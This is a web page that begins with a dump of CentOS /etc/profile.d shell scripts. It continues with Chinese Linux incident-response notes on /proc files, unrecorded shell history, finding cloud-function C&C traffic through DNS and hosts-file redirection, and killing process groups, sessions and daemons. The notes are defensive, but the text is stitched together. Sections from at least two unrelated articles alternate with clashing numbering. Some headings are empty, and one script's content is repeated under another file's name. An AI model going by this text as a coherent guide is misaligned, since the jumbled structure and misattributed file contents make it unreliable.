alias grep='grep --color=auto' 2>/dev/null
alias egrep='egrep --color=auto' 2>/dev/null
alias fgrep='fgrep --color=auto' 2>/dev/null
[root@localhost ~]# cat /etc/profile.d/colorls.csh
# skip everything for non-interactive shells
if (! $?prompt) exit

# color-ls initialization
if ( $?USER_LS_COLORS ) then
  if ( "$USER_LS_COLORS" != "" ) then
     #when USER_LS_COLORS defined do not override user
     #specified LS_COLORS and use them
     goto finish
  endif
endif

alias ll 'ls -l'
alias l. 'ls -d .*'
set COLORS=/etc/DIR_COLORS

if ($?TERM) then
  if ( -e "/etc/DIR_COLORS.$TERM" ) then
     set COLORS="/etc/DIR_COLORS.$TERM"
  endif
endif
if ( -f ~/.dircolors ) set COLORS=~/.dircolors
if ( -f ~/.dir_colors ) set COLORS=~/.dir_colors
if ($?TERM) then
  if ( -f ~/.dircolors."$TERM" ) set COLORS=~/.dircolors."$TERM"
  if ( -f ~/.dir_colors."$TERM" ) set COLORS=~/.dir_colors."$TERM"
endif
set INCLUDE="`/usr/bin/cat "$COLORS" | /usr/bin/grep '^INCLUDE' | /usr/bin/cut -d ' ' -f2-`"

if ( ! -e "$COLORS" ) exit

set _tmp="`/usr/bin/mktemp .colorlsXXX -q --tmpdir=/tmp`"
#if mktemp fails, exit when include was active, otherwise use $COLORS file
if ( "$_tmp" == '' ) then
  if ( "$INCLUDE" == '' ) then
    eval "`/usr/bin/dircolors -c $COLORS`"
  endif
  goto cleanup
endif

if ( "$INCLUDE" != '' ) /usr/bin/cat "$INCLUDE" >> $_tmp
/usr/bin/grep -v '^INCLUDE' "$COLORS" >> $_tmp

eval "`/usr/bin/dircolors -c $_tmp`"

/usr/bin/rm -f $_tmp

if ( "$LS_COLORS" == '' ) exit
cleanup:
set color_none=`/usr/bin/sed -n '/^COLOR.*none/Ip' < $COLORS`
if ( "$color_none" != '' ) then
   unset color_none
   exit
endif
unset color_none
unset _tmp
unset INCLUDE
unset COLORS

finish:
alias ll 'ls -l --color=auto'
alias l. 'ls -d .* --color=auto'
alias ls 'ls --color=auto'

```
 `/etc/profile.d/colorls.sh

```
 `# color-ls initialization

# Skip all for noninteractive shells.
[ ! -t 0 ] && return

#when USER_LS_COLORS defined do not override user LS_COLORS, but use them.
if [ -z "$USER_LS_COLORS" ]; then

  alias ll='ls -l' 2>/dev/null
  alias l.='ls -d .*' 2>/dev/null

  INCLUDE=
  COLORS=

  for colors in "$HOME/.dir_colors.$TERM" "$HOME/.dircolors.$TERM" \
      "$HOME/.dir_colors" "$HOME/.dircolors"; do
    [ -e "$colors" ] && COLORS="$colors" && \
    INCLUDE="`/usr/bin/cat "$COLORS" | /usr/bin/grep '^INCLUDE' | /usr/bin/cut -d ' ' -f2-`" && \
    break
  done

  [ -z "$COLORS" ] && [ -e "/etc/DIR_COLORS.$TERM" ] && \
  COLORS="/etc/DIR_COLORS.$TERM"

  [ -z "$COLORS" ] && [ -e "/etc/DIR_COLORS" ] && \
  COLORS="/etc/DIR_COLORS"

  # Existence of $COLORS already checked above.
  [ -n "$COLORS" ] || return

  if [ -e "$INCLUDE" ];
  then
    TMP="`/usr/bin/mktemp .colorlsXXX -q --tmpdir=/tmp`"
    [ -z "$TMP" ] && return

    /usr/bin/cat "$INCLUDE" >> $TMP
    /usr/bin/grep -v '^INCLUDE' "$COLORS" >> $TMP

    eval "`/usr/bin/dircolors --sh $TMP 2>/dev/null`"
    /usr/bin/rm -f $TMP
  else
    eval "`/usr/bin/dircolors --sh $COLORS 2>/dev/null`"
  fi

  [ -z "$LS_COLORS" ] && return
  /usr/bin/grep -qi "^COLOR.*none" $COLORS >/dev/null 2>/dev/null && return
fi

unset TMP COLORS INCLUDE

alias ll='ls -l --color=auto' 2>/dev/null
alias l.='ls -d .* --color=auto' 2>/dev/null
alias ls='ls --color=auto' 2>/dev/null

```

 `/etc/profile.d/colorxzgrep.csh

```

 `/etc/profile.d/colorxzgrep.sh

```

 `/etc/profile.d/colorzgrep.csh

```

 `/etc/profile.d/colorzgrep.sh

```

 `/etc/profile.d/csh.local

```

 `/etc/profile.d/debuginfod.csh

```

 `/etc/profile.d/debuginfod.sh

```
 `# $HOME/.profile* or similar files may first set $DEBUGINFOD_URLS.
# If $DEBUGINFOD_URLS is not set there, we set it from system *.url files.
# $HOME/.*rc or similar files may then amend $DEBUGINFOD_URLS.
# See also [man debuginfod-client-config] for other environment variables
# such as $DEBUGINFOD_MAXSIZE, $DEBUGINFOD_MAXTIME, $DEBUGINFOD_PROGRESS.

if [ -z "$DEBUGINFOD_URLS" ]; then
    prefix="/usr"
    DEBUGINFOD_URLS=$(cat /dev/null "/etc/debuginfod"/*.urls 2>/dev/null | tr '\n' ' ')
    [ -n "$DEBUGINFOD_URLS" ] && export DEBUGINFOD_URLS || unset DEBUGINFOD_URLS
    unset prefix
fi

```

 `/etc/profile.d/flatpak.sh

```
 `if command -v flatpak > /dev/null; then
    # set XDG_DATA_DIRS to include Flatpak installations

    new_dirs=$(
        (
            unset G_MESSAGES_DEBUG
            echo "${XDG_DATA_HOME:-"$HOME/.local/share"}/flatpak"
            GIO_USE_VFS=local flatpak --installations
        ) | (
            new_dirs=
            while read -r install_path
            do
                share_path=$install_path/exports/share
                case ":$XDG_DATA_DIRS:" in
                    (*":$share_path:"*) :;;
                    (*":$share_path/:"*) :;;
                    (*) new_dirs=${new_dirs:+${new_dirs}:}$share_path;;
                esac
            done
            echo "$new_dirs"
        )
    )

    export XDG_DATA_DIRS
    XDG_DATA_DIRS="${new_dirs:+${new_dirs}:}${XDG_DATA_DIRS:-/usr/local/share:/usr/share}"
fi

```

 `/etc/profile.d/gawk.csh

```

 `/etc/profile.d/gawk.sh

```
 `gawkpath_default () {
    unset AWKPATH
    export AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
}

gawkpath_prepend () {
    [ -z "$AWKPATH" ] && AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
    export AWKPATH="$*:$AWKPATH"
}

gawkpath_append () {
    [ -z "$AWKPATH" ] && AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
    export AWKPATH="$AWKPATH:$*"
}

gawklibpath_default () {
    unset AWKLIBPATH
    export AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
}

gawklibpath_prepend () {
    [ -z "$AWKLIBPATH" ] && \
        AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
    export AWKLIBPATH="$*:$AWKLIBPATH"
}

gawklibpath_append () {
    [ -z "$AWKLIBPATH" ] && \
        AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
    export AWKLIBPATH="$AWKLIBPATH:$*"
}

```

 `/etc/profile.d/lang.csh

```
 `# /etc/profile.d/lang.csh - exports environment variables, and provides fallback
#                          for CJK languages that can't be displayed in console.
#                          Resets the locale if unavailable.

unset LANG_backup

# If unavailable, reset to the default. Do this before reading in any
# explicit user configuration. We simply check if locale emits any
# warnings, and assume that the settings are invalid if it does.
set locale_error=`(/usr/bin/locale >/dev/null) |& cat`
if ("${locale_error}" != "") then
    if (${?LANG}) then
        setenv LANG C.UTF-8
    endif
    unsetenv LC_ALL
    setenv LC_CTYPE C.UTF-8
    setenv LC_NUMERIC C.UTF-8
    setenv LC_TIME C.UTF-8
    setenv LC_COLLATE C.UTF-8
    setenv LC_MONETARY C.UTF-8
    setenv LC_MESSAGES C.UTF-8
    setenv LC_PAPER C.UTF-8
    setenv LC_NAME C.UTF-8
    setenv LC_ADDRESS C.UTF-8
    setenv LC_TELEPHONE C.UTF-8
    setenv LC_MEASUREMENT C.UTF-8
    setenv LC_IDENTIFICATION C.UTF-8
else
    if (${?LANG}) then
        set LANG_backup=${LANG}
    endif
endif

foreach config (/etc/locale.conf "${HOME}/.i18n")
    if (-f "${config}") then
        # NOTE: We are using eval & sed here to avoid invoking of any commands & functions from those files.
        eval `/usr/bin/sed -r -e 's/^[[:blank:]]*([[:upper:]_]+)=([[:print:][:digit:]\._-]+|"[[:print:][:digit:]\._-]+")/setenv \1 \2;/;t;d' ${config}`
    endif
end

if (${?LANG_backup}) then
    setenv LANG "${LANG_backup}"
endif

unset LANG_backup config locale_error

# ----------------------------------------------

# The LC_ALL is not supposed to be set in /etc/locale.conf according to 'man 5 locale.conf'.
# If it is set, then we expect it is user's explicit override (most likely from ~/.i18n file).
# See 'man 7 locale' for more info about LC_ALL.
if (${?LC_ALL}) then
    if (${?LANG}) then
        if (${LC_ALL} != ${LANG}) then
            setenv LC_ALL
        else
            unsetenv LC_ALL
        endif
    else
        unsetenv LC_ALL
    endif
endif

# The ${LANG} manipulation is necessary only in virtual terminal (a.k.a. console - /dev/tty*):
set in_console=`/usr/bin/tty | /usr/bin/grep -vc -e '/dev/tty'`

if (${?LANG} && ${?TERM}) then
    if (${TERM} == 'linux' && $in_console == 0) then
        set utf8_used=`echo ${LANG} | /usr/bin/grep -vc -E -i -e '^.+\.utf-?8$'`

        if (${utf8_used} == 0) then
            switch (${LANG})
                case en_IN*:
                    breaksw
                case ja*:
                case ko*:
                case si*:
                case zh*:
                case ar*:
                case fa*:
                case he*:
                case *_IN*:
                    setenv LANG en_US.UTF-8
                    breaksw
            endsw
        else
            switch (${LANG})
                case en_IN*:
                    breaksw
                case ja*:
                case ko*:
                case si*:
                case zh*:
                case ar*:
                case fa*:
                case he*:
                case *_IN*:
                    setenv LANG en_US
                    breaksw
            endsw
        endif

        # NOTE: We are not exporting the ${LANG} here again on purpose.
        #       If user starts GUI session from console manually, then
        #       the previously set LANG should be okay to use.
    endif
endif

unset in_console utf8_used

```
 `/etc/profile.d/lang.sh

```
 `# /etc/profile.d/lang.sh - exports environment variables, and provides fallback
#                          for CJK languages that can't be displayed in console.
#                          Resets the locale if unavailable.

unset LANG_backup

# If unavailable, reset to the default. Do this before reading in any
# explicit user configuration. We simply check if locale emits any
# warnings, and assume that the settings are invalid if it does.
if [ -n "$(/usr/bin/locale 2>&1 1>/dev/null)" ]; then
    [ -z "$LANG" ] || LANG=C.UTF-8
    unset LC_ALL
    LC_CTYPE="C.UTF-8"
    LC_NUMERIC="C.UTF-8"
    LC_TIME="C.UTF-8"
    LC_COLLATE="C.UTF-8"
    LC_MONETARY="C.UTF-8"
    LC_MESSAGES="C.UTF-8"
    LC_PAPER="C.UTF-8"
    LC_NAME="C.UTF-8"
    LC_ADDRESS="C.UTF-8"
    LC_TELEPHONE="C.UTF-8"
    LC_MEASUREMENT="C.UTF-8"
    LC_IDENTIFICATION="C.UTF-8"
else
    LANG_backup="${LANG}"
fi

for config in /etc/locale.conf "${HOME}/.i18n"; do
    if [ -f "${config}" ]; then
        # NOTE: We are using eval & sed here to avoid invoking of any commands & functions from those files.
        if [ -x /usr/bin/sed ]; then
            eval $(/usr/bin/sed -r -e 's/^[[:blank:]]*([[:upper:]_]+)=([[:print:][:digit:]\._-]+|"[[:print:][:digit:]\._-]+")/export \1=\2/;t;d' ${config})
        else
            #but if we don't have sed, let's go old way and source it
            [ -f "${config}" ] && . "${config}"
        fi
    fi
done

if [ -n "${LANG_backup}" ]; then
    LANG="${LANG_backup}"
fi

unset LANG_backup config

# ----------------------------------------------

# The LC_ALL is not supposed to be set in /etc/locale.conf according to 'man 5 locale.conf'.
# If it is set, then we we expect it is user's explicit override (most likely from ~/.i18n file).
# See 'man 7 locale' for more info about LC_ALL.
if [ -n "${LC_ALL}" ]; then
    if [ "${LC_ALL}" != "${LANG}" -a -n "${LANG}" ]; then
        export LC_ALL
    else
        unset LC_ALL
    fi
fi

# The ${LANG} manipulation is necessary only in virtual terminal (a.k.a. console - /dev/tty*):
if [ -n "${LANG}" ] && [ "${TERM}" = 'linux' ] && /usr/bin/tty | /usr/bin/grep --quiet -e '/dev/tty'; then
    if /usr/bin/grep --quiet -E -i -e '^.+\.utf-?8$' <<< "${LANG}"; then
        case ${LANG} in
            ja*)    LANG=en_US.UTF-8 ;;
            ko*)    LANG=en_US.UTF-8 ;;
            si*)    LANG=en_US.UTF-8 ;;
            zh*)    LANG=en_US.UTF-8 ;;
            ar*)    LANG=en_US.UTF-8 ;;
            fa*)    LANG=en_US.UTF-8 ;;
            he*)    LANG=en_US.UTF-8 ;;
            en_IN*) true             ;;
            *_IN*)  LANG=en_US.UTF-8 ;;
        esac
    else
        case ${LANG} in
            ja*)    LANG=en_US ;;
            ko*)    LANG=en_US ;;
            si*)    LANG=en_US ;;
            zh*)    LANG=en_US ;;
            ar*)    LANG=en_US ;;
            fa*)    LANG=en_US ;;
            he*)    LANG=en_US ;;
            en_IN*) true       ;;
            *_IN*)  LANG=en_US ;;
        esac
    fi

    # NOTE: We are not exporting the ${LANG} here again on purpose.
    #       If user starts GUI session from console manually, then
    #       the previously set LANG should be okay to use.
fi

```

 `/etc/profile.d/less.csh

```

 `/etc/profile.d/less.sh

```
 `# less initialization script (csh)

# All less.*sh files should have the same semantics!

# In case you are curious, the test for non-emptiness is not as easy as in
# Bourne shell.  This "eval" construct is probably inspired by Stack
# Overflow question 13343392.
if ( $?LESSOPEN && { eval 'test ! -z "$LESSOPEN"' } ) then
    :
else
    if ( -x /usr/bin/lesspipe.sh ) then
        # The '||' here is intentional, see rhbz#1254837.
        setenv LESSOPEN "||/usr/bin/lesspipe.sh %s"
    endif
endif
[root@localhost ~]# cat /etc/profile.d/less.sh
# less initialization script (sh)

# All less.*sh files should have the same semantics!

if [ -z "$LESSOPEN" ] && [ -x /usr/bin/lesspipe.sh ]; then
    # The '||' here is intentional, see rhbz#1254837.
    export LESSOPEN="||/usr/bin/lesspipe.sh %s"
fi

```

 `/etc/profile.d/PackageKit.sh

```
 `# less initialization script (sh)

# All less.*sh files should have the same semantics!

if [ -z "$LESSOPEN" ] && [ -x /usr/bin/lesspipe.sh ]; then
    # The '||' here is intentional, see rhbz#1254837.
    export LESSOPEN="||/usr/bin/lesspipe.sh %s"
fi
[root@localhost ~]# cat /etc/profile.d/PackageKit.sh
# Copyright (C) 2008 Richard Hughes <richard@hughsie.com>
#
# Licensed under the GNU General Public License Version 2
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

command_not_found_handle () {
    local runcnf=1
    local retval=127

    # only search for the command if we're interactive
    [[ $- == *"i"* ]] || runcnf=0

    # don't run if DBus isn't running
    [[ ! -S /run/dbus/system_bus_socket ]] && runcnf=0

    # don't run if packagekitd doesn't exist in the _system_ root
    [[ ! -x '/usr/libexec/packagekitd' ]] && runcnf=0

    # don't run if bash command completion is being run
    [[ -n ${COMP_CWORD-} ]] && runcnf=0

    # don't run if we've been uninstalled since the shell was launched
    [[ ! -x '/usr/libexec/pk-command-not-found' ]] && runcnf=0

    # run the command, or just print a warning
    if [ $runcnf -eq 1 ]; then
        '/usr/libexec/pk-command-not-found' "$@"
        retval=$?
    elif [[ -n "${BASH_VERSION-}" ]]; then
        printf >&2 'bash: %s%s\n' "${1:+$1: }" "$(gettext PackageKit 'command not found')"
    fi

    # return success or failure
    return $retval
}

if [[ -n "${ZSH_VERSION-}" ]]; then
    command_not_found_handler () {
        command_not_found_handle "$@"
    }
fi

```

 `/etc/profile.d/sh.local

```

 `/etc/profile.d/vte.csh

```
 `# Copyright © 2019 Red Hat, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
# Red Hat Author(s): Carlos Santos

# exit if non-interactive, csh, no terminal or old VTE versions
if ( ! $?prompt | ! $?tcsh | ! $?TERM | ! $?VTE_VERSION ) exit

switch($TERM)
  case xterm*:
    alias precmd 'echo -n "\e]7;file://$HOST"; /usr/libexec/vte-urlencode-cwd; echo -n "\e\\"'
endsw

```

 `/etc/profile.d/vte.sh

```
 `# Copyright © 2012 Christian Persch
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# Not bash or zsh?
[ -n "${BASH_VERSION:-}" -o -n "${ZSH_VERSION:-}" ] || return 0

# Not an interactive shell?
[[ $- == *i* ]] || return 0

# Not running under vte?
[ "${VTE_VERSION:-0}" -ge 3405 ] || return 0

__vte_osc7 () {
  printf "\033]7;file://%s%s\033\\" "${HOSTNAME}" "$(/usr/libexec/vte-urlencode-cwd)"
}

__vte_prompt_command() {
  local command=$(HISTTIMEFORMAT= history 1 | sed 's/^ *[0-9]\+ *//')
  command="${command//;/ }"
  local pwd='~'
  [ "$PWD" != "$HOME" ] && pwd=${PWD/#$HOME\//\~\/}
  pwd="${pwd//[[:cntrl:]]}"
  printf '\033]777;notify;Command completed;%s\033\\\033]777;precmd\033\\\033]0;%s@%s:%s\033\\' "${command}" "${USER}" "${HOSTNAME%%.*}" "${pwd}"
  __vte_osc7
}

case "$TERM" in
  xterm*|vte*)
    [ -n "${BASH_VERSION:-}" ] && PROMPT_COMMAND="__vte_prompt_command" && PS0=$(printf "\033]777;preexec\033\\")
    [ -n "${ZSH_VERSION:-}"  ] && precmd_functions+=(__vte_osc7)
    ;;
esac

true

```

 `/etc/profile.d/which2.csh

```

 `/etc/profile.d/which2.sh

```
 `# shellcheck shell=sh
# Initialization script for bash, sh, mksh and ksh

case "$(basename $(readlink /proc/$$/exe))" in
*ksh*)
    which_declare=""
    which_opt=""
    ;;
zsh)
    which_declare="typeset -f"
    which_opt=""
    ;;
bash|sh)
    which_declare="declare -f"
    which_opt="-f"
    ;;
*)
    which_declare=""
    which_opt=""
    ;;
esac

function which {
    (alias; eval ${which_declare}) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot $@
}

export which_declare
export ${which_opt} which

```

### 0x03 SSH隧道

隧道跟管子一样，两端都可以作为入口、出口，实验主机分配如下

攻击机就用我的物理机 10.211.55.2

被控主机（做隧道的主机）Centos 10.211.55.11

访问受限主机 Ubuntu 10.211.55.10

### 0x04 线程内存相关信息文件存储位置

我们都知道，Linux 上启动的进程都有一个专属的 `/proc/<pid>/` 这样的目录，目录中存储着相关的信息，比如内存地址，启动的文件等。在之前检查的章节中我们讲述了一些关于线程查看和检查的内容，但是没有讲过线程相关的文件都在什么位置，这里补充上

`/proc/<pid>/task`

这里我们找一些系统默认的多线程的进程

这里以一个 python 相关进程来说，该进程存在两个线程，线程文件夹中内容如下：

和 Linux 中进程的内容基本是一样的,我们也可以通过这些文件获取我们想要的信息

### 0x05 与C&amp;C隐藏技术的对抗

### 0x06 history 无记录的可能原因

- 攻击者清空日志文件内容
 - 攻击者通过设置权限或者环境变量配置为不记录日志
 - 攻击者使用 `history -c` 等清空 history 缓冲区
 - SSH 等远程登录过程中网络中断，导致没有将缓冲区写入到文件
 - 攻击者执行命令时在前面加了一个空格
 - 攻击者使用各种编程语言解析器，在编程语言代码中执行命令

 有态度，不苟同！

### 1. 简介

在攻防演练中，使用云函数来隐藏 C&C 的 ip 地址已经成为了一种“标配”

在应急处置过程中，我们经常遇到  `netstat -pantu | grep ip`  无法找到安全设备关于红队外连的告警

由于 C&C 的 ip 地址是一直变化的，所以常规的 `netstat -pantu | grep ip` 这种模式就可能行不通了

以目前国内厂商对云函数的支持来看，主要集中在 80， 443 这两个端口。所以如果要排查的服务器对外访问 80 和 443 不多的情况下还是可以一个一个分析的

但这终究是个麻烦事，所以有了今天的这篇文章

我们对抗云函数的方式无非就是从 DNS 解析下手

但是 Linux 默认的程序组合几乎无法实时获取到究竟是哪一个发起了解析了云函数的域名的 DNS 请求

所以，我们需要人工干预一下，将云函数的网站的解析地址换成我们自己的地址，之后通过筛连接了我们指定的地址的 80 或者 443 端口的进程，获取到 pid 后再获取进程详细信息

### 1. 案例1

我们输入

 `ping www.baidu.com

```

大家都知道，此时我们启动了一个程序 ping ,并且创建了一个进程，我们再开一个终端ssh连接这个服务器看一下

可以看到，我们起了一个PID为1779的进程，进程在不断向我们打印ping的结果，那么本质上来讲是什么样的呢？

我们使用 ps -w ajfx 来看一下

 - pid，pgid，sid均为890的 sshd 守护进程生成一个SID为1494的session，同时创建了一个pid为1494的子进程“sshd: helper [priv]” ，并且创建了一个进程组，此进程就是进程组的leader，进程组的PGID等于此进程的pid 1494，这个进程就是该session的leader
 - “sshd: helper [priv]”创建了一个PID为1518子进程 “sshd: helper@pts/2” ，其实就是开了一个虚拟终端 pts
 - 虚拟终端pts生成了一个SID为1519的session，创建了一个pid为1519的子进程 “bash”,并且创建了一个新的进程组，新进程组的PGID等于新的子进程的PID为1519，这个子进程为进程组的leader，也是这个session的leader。
 - bash创建了一个pid为1779的子进程 “ping www.baidu.com”，同时创建一个新的进程组，PGID为1779，并且这是一个前台进程

### 2. 案例2

我们输入

 `ping www.baidu.com &

```

可以看到，ping百度 这个操作的“交互”已经放到后台了，但是依旧像终端输出，我们可以正常输入命令ls,pwd等，执行返回也都正常

 `ps -w ajfx

```

同样的过程就不重复了，不一样的地方在于

这里是 ps -w 命令的 STAT 列，具体字符含义如下

 - D 不能中断的进程（通常为IO）
 - R 正在运行中的进程
 - S 已经中断的进程，通常情况下，系统中大部分进程都是这个状态
 - T 已经停止或者暂停的进程，如果我们正在运行一个命令，比如说sleep 10，如果我们按一下ctrl -z 让他暂停，那我们用ps查看就会显示T这个状态
 - W 这个好像是说，从内核2.6xx 以后，表示为没有足够的内存页分配
 - X 已经死掉的进程（这个好像从来不会出现）
 - Z 僵尸进程，杀不掉，打不死的垃圾进程，占系统一小点资源，不过没有关系。如果太多，就有问题了。一般不会出现。

 下面一些是BSD风格的参数

 - < 高优先级进程
 - N 低优先级进程
 - L 在内存中被锁了内存分页
 - s 主进程
 - l 多线程进程
 - + 代表在前台运行的进程

 可以看出

 - 执行 ping www.baidu.com 的时候ping是前台运行的进程， bash是后台运行的进程
 - 执行 ping www.baidu.com & 的时候ping是后台运行的进程， bash是前台运行的进程

 如果上面涉及的所有概念你都能清晰的理解，那么下面的内容你也可以看一看，毕竟来都来了...

### 2. 查看 DNS 缓存记录

如果是 windows ，这件事是非常简单的，在 Linux 中就变得麻烦很多，我们需要使用下面的命令来进行获取 DNS 缓存记录

 `sudo killall -USR1 systemd-resolved
sudo journalctl -u systemd-resolved > ~/dns-cache.txt
cat ~/dns-cache.txt | grep tencentcs.com

```
 如果攻击者使用了云函数，那么应该会保存 DNS 的解析记录，我们只需要将常见的云函数的网站地址作为筛选条件进行筛选即可，这里以腾讯云的云函数为例

常见云函数、CDN之类的网站地址有：

 `tencentcs.com
herokuapp.com
worker.dev
*.tk

```
 假设获取到的域名为 `service-123456.bj.tencentcs.com`

### 3. 进程组

进程的概念大家都能理解的话，进程组就很好说了，其实就是一堆进程捆一起了，之后形成一个组就叫进程组了

这么做肯定是有意义的，不然Linux也不会这么搞，主要还是为了方便管理。

公司为了方便管理，给人分组，方便分配工作；社会为了方便管理，给人区分成年人，未成年人，老人；我们又因为爱好，信念等被分成了各种各样的小组...

系统把同一个job（作业）的进程分成一个组，既然有组织肯定得有组长，组的ID（PGID）就采用组长的PID

这里有一个问题，如果组长进程死亡了，小组还存在吗？如果存在组长归谁？

如果组长进程死亡了，小组只要还剩下进程就会存在，此时组长不会变，PGID也不会变；就像纪念一样...

实验一下：

 `#include <unistd.h>
#include <stdio.h>

int main()
{
    setbuf(stdout, NULL);
    pid_t pid;
    pid = fork();
    if(pid == 0){
        printf("child pid: %d\n", getpid());
        while(1){
            sleep(1);
            printf("child\n");
        }
    } else {
        printf("father pid %d\n", getpid());
        while(1){
            sleep(1);
            printf("father\n");
        }
    }

}

```

从ps的结果可以看到，我们的程序创建了两个进程，两个进程属于同一个进程组，PGID为29938

现在我们kill 掉进程组leader 29938

 `kill -9 29938

```

当我们kill掉进程leader之后，立马father就不打印了，但是child依旧在打印，这说明父进程被杀死，子进程还活着，接下来看看子进程活得怎么样

好家伙，父进程被杀死后，子进程直接把PPID设置为1，但是进程组PGID依旧没变，还是29938 ，session的id SID也没有发生变化，还是29756

此时这个子进程被称为孤儿进程

这里我们就需要注意了，一个木马或者后门如果主进程还存在子进程，仅仅 kill -9 pid 杀死主进程可能是没用的，因为不会杀死子进程

问题来了，如果我想把这些木马病毒进程都干掉，怎么操作？

我见过各种骚操作，有的是写脚本，有的是手动挨个杀，用killall、pkill等等，这种回复一看就是没遇到那种进程pid，进程名称一直变化的

其实非常简单，我们只需要把这个进程组给杀死就好了

 `kill -9 -PGID

```
 没有看错，其实就是在 PGID 前面加个减号

需要注意的是， `kill -9 -PGID` 配合 `sudo` 使用时，需要将命令修改为以下格式

 `sudo kill -9 -- -PGID

```
 也可以使用 `pkill` 来完成

 `sudo pkill -g PGID   # 进程组前没有横杠

```
 实验开始：

可以看到，父子进程都起来了，pid分别为29949和29950

这个时候我们杀掉这个进程组

 `kill -9 -29949

```

可以看到，这个进程组已经没有了，渣都不剩！

这里一定要注意，你杀的是一个进程组，一定要注意，进程组里是否有正常业务进程，别杀错了

### 3. 服务器配置监控程序

当服务器对我们的监听端口发起了连接，就将发起连接的进程相关信息记录下来

此处 VPS ip 以 1.1.1.1 为例

 `#!/bin/bash

while true
do
    sleep 0.1
    pids=$(netstat -pantu | grep 1.1.1.1 | awk -F "/" '{print $1}' | awk -F " " '{print $NF}' | sort | uniq)
    for one_pid in $pids
    do
        if [ $one_pid == "-" ]; then
            continue
        fi

        echo "" >> $(pwd)/virus_info.txt
        echo "[ lsof -p $one_pid ]" >> $(pwd)/virus_info.txt
        lsof -p $one_pid >> $(pwd)/virus_info.txt
        echo "" >> $(pwd)/virus_info.txt
        echo "[ cat /proc/$one_pid/maps -w ]" >> $(pwd)/virus_info.txt
        cat /proc/$one_pid/maps -w >> $(pwd)/virus_info.txt
        echo "" >> $(pwd)/virus_info.txt
        echo "[ ls -al /proc/$one_pid/exe ]" >> $(pwd)/virus_info.txt
        ls -al /proc/$one_pid/exe >> $(pwd)/virus_info.txt
    done
    if [ -f "$(pwd)/virus_info.txt" ]; then
        echo "Found it !"
        exit
    fi
done

```

### 4. 修改 HOSTS 文件，建立解析记录

root 用户下执行，VPS IP 以 `1.1.1.1` 为例

 `echo "1.1.1.1 service-123456.bj.tencentcs.com" >> /etc/hosts

```

Linux 的 hosts 文件是不支持通配符的，也就是配置 `*.tencentcs.com` 是无效的

所以，如果在 0x01 步未获取到云函数的具体域名，那就需要借助 Dnsmasq 这类程序或者外部网络设备来进行辅助，原理是一样的

### 4. Session

其实文章开头我们已经简单提到过了，我们一般讨论的都是shell session，我们打开一个新的终端就会创建一个session，每个session都是由一个或者多个进程组组成的，每个进程组称为 job，这里job不是任务，而叫作业

从描述中可以看出，session管理的范围要比进程组大，打开一个终端，你执行100条命令，只要没有新的session生成（调用 setsid()函数可以生成新的session ），那么这些命令可以通过session进行统一管理，当然最常见的管理方式还是全部杀死，但是这个杀伤力太大了，所以一般不使用，主要还是了解session的概念，从web安全过来的对于session这种机制应该很容易理解

session中的第一个进程（一般是bash）的PID就是session的SID

现在大招来了，如何干掉整个session呢？

 `pkill -s SID

```
 实验开始

可以看到，fk的SID为29756

 `pkill -e -s 29756

```

可以看到，杀掉了这个SID下的三个进程，分别为 29756, 29957, 29958

-e 参数是现实杀掉了谁,多人性化

可以看到，杀掉了bash进程后，ssh链接就断开了

### 5. 守护进程(daemon)

守护进程这个词经常听到，名字还挺温暖，遗憾的是总是在处理linux挖矿病毒的案例中听到，简直破坏美感

守护进程的一个特点就是进程不受任何终端控制

不受任何终端控制这个定义似乎有些模糊，所以我试图去找到一些限定条件，大部分人是这样说的：

 - 随系统启动而启动
 - 父进程是init，也就是ppid为1
 - 在后台运行
 - 进程名字通常以字母 d 结束
 - ps显示中终端名设置为问号(?)，终端前台进程组ID设置为-1
 - 工作目录为 \ （根）

 这其中很明显不完全准确，但是也都是基于实际情况分析出来的，所以我一直在纠结后台进程、nohup起的后台进程和守护进程是什么关系，直到遇到了这篇文章，我觉得才是说的比较透彻的

我直接摘过来：

 - 没有控制终端，终端名设置为？号：也就意味着没有 stdin 0 、stdout 1、stderr 2

 - 父进程不是用户创建的进程，init进程或者systemd（pid=1）以及用户人为启动的用户层进程一般以pid=1的进程为父进程，而以kthreadd内核进程创建的守护进程以kthreadd为父进程

 - 守护进程一般是会话首进程、组长进程。

 - 工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘

 守护进程在后台默默提供着服务，但是不接受任何终端的管控，没有标准输入、标准输出、标准错误，比较典型的有mysqld， sshd等，当然我们也是可以创建一个守护进程的，步骤如下：

直接摘抄吧：

 - `执行一个fork()，之后父进程退出，子进程继续执行。`（结果就是daemon成为了init进程的子进程。）之所以要做这一步是因为下面两个原因：
 - 假设daemon是从命令行启动的，父进程的终止会被shell发现，shell在发现之后会显示出另一个shell提示符并让子进程继续在后台运行。
 - 子进程被确保不会称为一个进程组组长进程，因为它从其父进程那里继承了进程组ID并且拥有了自己的唯一的进程ID，而这个进程ID与继承而来的进程组ID是不同的，这样才能够成功地执行下面一个步骤。
